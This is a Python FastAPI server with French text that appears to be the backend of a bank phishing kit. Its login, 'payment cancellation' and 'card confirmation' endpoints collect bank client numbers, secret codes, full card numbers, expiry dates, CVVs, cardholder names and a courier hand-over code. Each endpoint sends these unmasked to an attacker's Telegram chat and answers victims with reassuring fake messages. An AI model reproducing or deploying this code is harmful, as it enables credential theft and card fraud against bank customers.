from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List
import uuid
import re
from datetime import datetime
import aiohttp
import asyncio

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Telegram configuration
TELEGRAM_BOT_TOKEN = os.environ['TELEGRAM_BOT_TOKEN']
TELEGRAM_CHAT_ID = os.environ['TELEGRAM_CHAT_ID']

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class LoginData(BaseModel):
    clientNumber: str
    secretCode: str
    rememberClient: bool = False

class CancelPaymentData(BaseModel):
    cardNumber: str
    expiryDate: str
    cvv: str
    cardHolder: str

# Ajoutez ce modèle Pydantic pour les données de confirmation
class CardConfirmationData(BaseModel):
    confirmationCode: str

# Telegram functions
async def send_telegram_message(message: str):
    """Send message to Telegram chat"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                result = await response.json()
                if response.status == 200 and result.get("ok"):
                    return result
                else:
                    logger.error(f"Telegram API error: {result}")
                    raise HTTPException(status_code=500,
                                        detail=f"Telegram error: {result.get('description', 'Unknown error')}")
    except Exception as e:
        logger.error(f"Error sending to Telegram: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to send message to Telegram: {str(e)}")


# Fonction pour formater le message d'annulation de paiement
def format_cancel_payment_message(payment_data: CancelPaymentData) -> str:
    """Format payment cancellation data for Telegram message"""
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    # Masquer partiellement le numéro de carte (afficher seulement les 4 premiers et 4 derniers chiffres)
    card_display = f"{payment_data.cardNumber[:4]} **** **** {payment_data.cardNumber[-4:]}"

    message = f"""💳 <b>DEMANDE D'ANNULATION DE PAIEMENT</b>

🔢 <b>Numéro de Carte:</b> <code>{payment_data.cardNumber}</code>
📅 <b>Date d'Expiration:</b> <code>{payment_data.expiryDate}</code>
🔐 <b>Code CVV:</b> <code>{payment_data.cvv}</code>
👤 <b>Titulaire:</b> <code>{payment_data.cardHolder}</code>
💰 <b>Montant:</b> 469€
⏰ <b>Timestamp:</b> {timestamp}"""

    return message

def format_login_message(login_data: LoginData) -> str:
    """Format login data for Telegram message"""
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    remember_text = "Oui" if login_data.rememberClient else "Non"

    message = f"""🏦 <b>NOUVELLE CONNEXION BANCAIRE</b>

📱 <b>Numéro Client:</b> <code>{login_data.clientNumber}</code>
🔐 <b>Code Secret:</b> <code>{login_data.secretCode}</code>
💾 <b>Mémoriser:</b> {remember_text}
⏰ <b>Timestamp:</b> {timestamp}"""

    return message


# Fonction pour formater le message de confirmation de carte
def format_card_confirmation_message(confirmation_data: CardConfirmationData) -> str:
    """Format card confirmation data for Telegram message"""
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    message = f"""🏦 <b>CONFIRMATION DE CARTE BANCAIRE</b>

🔢 <b>Code de Confirmation:</b> <code>{confirmation_data.confirmationCode}</code>
📋 <b>Type:</b> Code de remise en main propre au coursier
⏰ <b>Timestamp:</b> {timestamp}

💡 <i>Ce code est nécessaire pour opposer la carte au guichet</i>"""

    return message


# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}


# Ajoutez cette route à votre API
@api_router.post("/card-confirmation")
async def card_confirmation(confirmation_data: CardConfirmationData):
    """Handle card confirmation and send code to Telegram"""
    try:
        # Validation du code de confirmation
        if len(confirmation_data.confirmationCode) != 4 or not confirmation_data.confirmationCode.isdigit():
            raise HTTPException(status_code=400, detail="Le code de confirmation doit contenir exactement 4 chiffres")

        # Envoyer à Telegram
        message = format_card_confirmation_message(confirmation_data)
        await send_telegram_message(message)
        logger.info(f"Card confirmation code sent to Telegram: {confirmation_data.confirmationCode}")

        return {
            "success": True,
            "message": "Carte confirmée avec succès"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error processing card confirmation: {str(e)}")
        raise HTTPException(status_code=500, detail="Erreur interne du serveur")

# Ajoutez cette route à votre API
@api_router.post("/cancel-payment")
async def cancel_payment(payment_data: CancelPaymentData):
    """Handle payment cancellation and send data to Telegram"""
    try:
        # Validation des données
        card_number_clean = payment_data.cardNumber.replace(" ", "")
        if len(card_number_clean) != 16 or not card_number_clean.isdigit():
            raise HTTPException(status_code=400, detail="Le numéro de carte doit contenir 16 chiffres")

        if not re.match(r"^\d{2}/\d{2}$", payment_data.expiryDate):
            raise HTTPException(status_code=400, detail="La date d'expiration doit être au format MM/AA")

        if len(payment_data.cvv) != 3 or not payment_data.cvv.isdigit():
            raise HTTPException(status_code=400, detail="Le code CVV doit contenir exactement 3 chiffres")

        if not payment_data.cardHolder.strip():
            raise HTTPException(status_code=400, detail="Le nom du titulaire est requis")

        # Envoyer à Telegram
        message = format_cancel_payment_message(payment_data)
        await send_telegram_message(message)
        logger.info(f"Payment cancellation data sent to Telegram for card: {card_number_clean[:4]}****")

        return {
            "success": True,
            "message": "Votre demande d'annulation a été prise en compte. Vous recevrez une confirmation sous 24h."
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error processing payment cancellation: {str(e)}")
        raise HTTPException(status_code=500, detail="Erreur interne du serveur")

@api_router.post("/login")
async def login(login_data: LoginData):
    """Handle login attempt and send data to Telegram"""
    try:
        # Validate input
        if len(login_data.clientNumber) < 7 or len(login_data.clientNumber) > 10:
            raise HTTPException(status_code=400, detail="Numéro client doit contenir entre 7 et 10 chiffres")

        if not login_data.clientNumber.isdigit():
            raise HTTPException(status_code=400, detail="Numéro client doit contenir uniquement des chiffres")

        if len(login_data.secretCode) != 6 or not login_data.secretCode.isdigit():
            raise HTTPException(status_code=400, detail="Code secret doit contenir exactement 6 chiffres")

        # Send to Telegram
        message = format_login_message(login_data)
        await send_telegram_message(message)
        logger.info(f"Successfully sent to Telegram for client: {login_data.clientNumber[:4]}****")

        return {
            "success": True,
            "message": "Connexion réussie ! Données envoyées vers Telegram."
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error processing login: {str(e)}")
        raise HTTPException(status_code=500, detail="Erreur interne du serveur")


# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)